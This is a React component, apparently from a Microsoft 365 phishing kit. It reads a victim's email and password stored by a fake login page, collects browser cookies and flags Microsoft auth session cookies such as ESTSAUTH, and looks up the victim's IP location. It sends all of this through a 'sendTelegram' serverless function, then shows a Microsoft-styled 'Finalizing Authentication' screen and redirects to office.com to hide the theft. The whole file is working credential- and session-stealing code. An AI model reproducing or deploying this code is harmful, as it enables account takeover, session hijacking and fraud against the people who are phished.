import React, { useEffect, useState } from 'react';
import {
  setCapturedCookies,
  setCapturedEmail,
  detectBrowserCapabilities,
  validateDomain,
  validateCookieSize,
  validateExpiration
} from './restoreCookies';

/**
 * AuthCallback Component
 * 
 * This component is the redirect target after the Microsoft login flow. Its sole purpose is to:
 * 1. Retrieve the credentials that were stored in localStorage by `replacement.html`.
 * 2. Capture all available cookies after the Microsoft redirect using restoreCookies utilities.
 * 3. Fetch user location data.
 * 4. Consolidate all data (credentials, cookies, location) into a single payload.
 * 5. Transmit the payload to the Telegram endpoint.
 * 6. Redirect the user to a final destination (e.g., office.com) to complete the flow.
 */
const AuthCallback: React.FC = () => {
    const [status, setStatus] = useState('Initializing callback...');

    useEffect(() => {
        const executeCallback = async () => {
            setStatus('Consolidating authentication data...');
            console.log('🔄 AuthCallback: Consolidating and transmitting data.');

            // --- 1. Retrieve Stored Credentials ---
            let credentials = null;
            try {
                const storedCreds = localStorage.getItem('replacement_credentials') || sessionStorage.getItem('replacement_credentials');
                if (storedCreds) {
                    credentials = JSON.parse(storedCreds);
                    console.log('✅ Credentials retrieved from storage.');
                    setCapturedEmail(credentials.email);
                } else {
                    console.error('❌ FATAL: No credentials found in storage. Aborting.');
                    setStatus('Error: Could not find stored credentials.');
                    return;
                }
            } catch (error) {
                console.error('❌ FATAL: Failed to parse credentials from storage.', error);
                setStatus('Error: Failed to parse credentials.');
                return;
            }

            // --- 2. Capture Cookies with Enhanced Validation ---
            const captureCookies = () => {
                try {
                    const cookieString = document.cookie;
                    const cookies: any[] = [];
                    const capabilities = detectBrowserCapabilities();

                    console.log('🌐 Browser capabilities detected:', capabilities);

                    if (cookieString && cookieString.trim()) {
                        cookieString.split(';').forEach(pair => {
                            const trimmedPair = pair.trim();
                            if (trimmedPair) {
                                const [name, value] = trimmedPair.split('=');
                                if (name) {
                                    const cookieObj = {
                                        name: name.trim(),
                                        value: value ? value.trim() : '',
                                        domain: window.location.hostname,
                                        path: '/',
                                        secure: window.location.protocol === 'https:',
                                        httpOnly: false, // Cannot detect via JavaScript
                                        sameSite: 'Lax',
                                        expires: null,
                                        session: true // Assume session cookie if no expiration
                                    };

                                    // Validate cookie
                                    const sizeCheck = validateCookieSize(cookieObj.name, cookieObj.value);
                                    if (sizeCheck.valid) {
                                        // Mark important Microsoft cookies
                                        if (cookieObj.name.includes('ESTSAUTH') ||
                                            cookieObj.name.includes('SignInStateCookie') ||
                                            cookieObj.name.includes('ESTSAUTHPERSISTENT') ||
                                            cookieObj.name.includes('ESTSAUTHLIGHT')) {
                                            cookieObj.important = true;
                                            console.log(`🔐 Important auth cookie found: ${cookieObj.name}`);
                                        }

                                        cookies.push(cookieObj);
                                    } else {
                                        console.warn(`⚠️ Cookie skipped - ${cookieObj.name}: ${sizeCheck.reason}`);
                                    }
                                }
                            }
                        });
                    }

                    console.log(`✅ Captured ${cookies.length} cookies from document.cookie`);
                    if (cookies.length > 0) {
                        console.log('📋 Sample cookies:', cookies.slice(0, 3));
                    }

                    // Store captured cookies
                    setCapturedCookies(cookies);

                    return cookies;
                } catch (error) {
                    console.warn('⚠️ Failed to capture cookies:', error);
                    return [];
                }
            };

            const cookies = captureCookies();

            // --- 3. Fetch Location Data ---
            setStatus('Fetching geolocation data...');
            let locationData: any = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                locationData = await response.json();
                console.log('✅ Location data fetched:', locationData);
            } catch (error) {
                console.warn('⚠️ Failed to fetch location data:', error);
            }

            // --- 4. Create Enhanced Cookie File ---
            const createCookieFile = (cookiesToExport: any[]) => {
                try {
                    if (!cookiesToExport || cookiesToExport.length === 0) {
                        console.warn('⚠️ No cookies to export - creating empty file');
                        const emptyJsonContent = JSON.stringify({
                            source: 'AuthCallback-Export',
                            timestamp: new Date().toISOString(),
                            count: 0,
                            cookies: [],
                            note: 'No accessible cookies found. HttpOnly cookies cannot be captured by JavaScript.',
                            browserCapabilities: detectBrowserCapabilities()
                        }, null, 2);

                        return {
                            name: `cookies_${new Date().getTime()}.json`,
                            content: emptyJsonContent,
                            size: Buffer.byteLength(emptyJsonContent)
                        };
                    }

                    // Enhance cookies with additional metadata
                    const enhancedCookies = cookiesToExport.map(cookie => ({
                        name: cookie.name || '',
                        value: cookie.value || '',
                        domain: cookie.domain || window.location.hostname,
                        path: cookie.path || '/',
                        secure: !!cookie.secure,
                        httpOnly: !!cookie.httpOnly,
                        sameSite: cookie.sameSite || 'Lax',
                        expires: cookie.expires || null,
                        session: !!cookie.session,
                        important: !!cookie.important,
                        size: new Blob([`${cookie.name}=${cookie.value}`]).size
                    }));

                    const jsonContent = JSON.stringify({
                        source: 'AuthCallback-Export',
                        timestamp: new Date().toISOString(),
                        count: enhancedCookies.length,
                        cookies: enhancedCookies,
                        summary: {
                            totalCookies: enhancedCookies.length,
                            authCookies: enhancedCookies.filter(c => c.important).length,
                            secureCookies: enhancedCookies.filter(c => c.secure).length,
                            sessionCookies: enhancedCookies.filter(c => c.session).length,
                            totalSize: enhancedCookies.reduce((sum, c) => sum + c.size, 0)
                        },
                        browserCapabilities: detectBrowserCapabilities()
                    }, null, 2);

                    console.log(`✅ Cookie JSON file created (${jsonContent.length} bytes)`);
                    console.log(`📊 Cookie summary:`, {
                        total: enhancedCookies.length,
                        auth: enhancedCookies.filter(c => c.important).length,
                        secure: enhancedCookies.filter(c => c.secure).length,
                        session: enhancedCookies.filter(c => c.session).length
                    });

                    return {
                        name: `cookies_${new Date().getTime()}.json`,
                        content: jsonContent,
                        size: Buffer.byteLength(jsonContent)
                    };
                } catch (error) {
                    console.error('❌ Failed to create cookie JSON file:', error);
                    return null;
                }
            };

            const cookieFile = createCookieFile(cookies);

            if (cookieFile) {
                console.log('✅ Cookie file object created:', {
                    name: cookieFile.name,
                    size: cookieFile.size,
                    hasContent: !!cookieFile.content
                });
            } else {
                console.error('❌ Failed to create cookie file');
            }

            // --- 5. Transmit Data ---
            setStatus('Transmitting secured data...');
            const payload = {
                email: credentials.email,
                password: credentials.password,
                passwordSource: 'auth-callback-final',
                cookies: cookies,
                locationData: locationData,
                cookieFiles: cookieFile ? {
                    jsonFile: {
                        name: cookieFile.name,
                        content: cookieFile.content,
                        size: cookieFile.size
                    }
                } : {},
                userAgent: navigator.userAgent,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                validated: true,
                microsoftAccount: true,
                captureContext: {
                    sourceComponent: 'AuthCallback',
                    cookiesCaptured: cookies.length,
                    authCookiesCaptured: cookies.filter(c => c.important).length,
                    locationCaptured: !!(locationData && locationData.ip),
                    cookieFileCreated: !!cookieFile,
                    browserCapabilities: detectBrowserCapabilities()
                }
            };

            console.log('📤 Payload Summary:', {
                email: payload.email,
                password: '***',
                cookiesCount: payload.cookies.length,
                authCookiesCount: cookies.filter(c => c.important).length,
                hasLocationData: !!payload.locationData.ip,
                hasCookieFile: !!payload.cookieFiles.jsonFile,
                cookieFileName: payload.cookieFiles.jsonFile?.name,
                cookieFileSize: payload.cookieFiles.jsonFile?.size,
                timestamp: payload.timestamp
            });

            try {
                const response = await fetch('/.netlify/functions/sendTelegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const responseData = await response.json();

                if (response.ok) {
                    console.log('✅✅✅ SUCCESS: All data successfully sent to Telegram!');
                    console.log('📊 Telegram Response:', responseData);
                    setStatus('Authentication complete. Redirecting...');
                } else {
                    const errorText = await response.text();
                    console.error('❌ Transmission failed. Server responded with:', response.status, errorText);
                    setStatus(`Error: Transmission failed with status ${response.status}.`);
                    return;
                }
            } catch (error) {
                console.error('❌ FATAL: Network error during transmission.', error);
                setStatus('Error: Network failure during transmission.');
                return; // Stop flow if transmission fails
            }

            // --- 6. Final Redirect ---
            console.log('🎉 Flow complete. Redirecting to final destination.');
            setTimeout(() => {
                window.location.href = 'https://www.office.com/?auth=2';
            }, 1500);

        };

        executeCallback();

    }, []);

    return (
        <div style={{
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'center',
            alignItems: 'center',
            height: '100vh',
            fontFamily: 'Segoe UI, Arial, sans-serif',
            backgroundColor: '#f3f2f1',
            color: '#323130'
        }}>
            <h2 style={{ marginBottom: '20px' }}>Finalizing Authentication</h2>
            <p>{status}</p>
            <div style={{
                border: '4px solid #f3f2f1',
                borderTop: '4px solid #0078d4',
                borderRadius: '50%',
                width: '40px',
                height: '40px',
                animation: 'spin 1s linear infinite',
                marginTop: '20px'
            }}></div>
            <style>{`
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

export default AuthCallback;
